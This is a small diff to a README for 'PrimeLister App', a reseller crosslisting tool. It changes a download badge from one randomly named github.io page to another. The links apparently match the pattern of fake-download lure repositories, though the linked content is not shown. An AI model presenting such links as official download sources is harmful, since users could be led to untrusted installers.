@@ -1,6 +1,6 @@
 # PrimeLister App - Reseller Listing and Crosslisting Software
 
-[![GET PrimeLister](https://img.shields.io/badge/GET%20%E2%80%94%20PrimeLister-0078D6?style=for-the-badge&logoColor=white)](https://imranesparzazqvc.github.io/.github/primelister-app)
+[![GET PrimeLister](https://img.shields.io/badge/GET%20%E2%80%94%20PrimeLister-0078D6?style=for-the-badge&logoColor=white)](https://maximusbentonoxyb.github.io/.github/primelister-app)
 
 ## PrimeLister Seller Workflow Overview
 
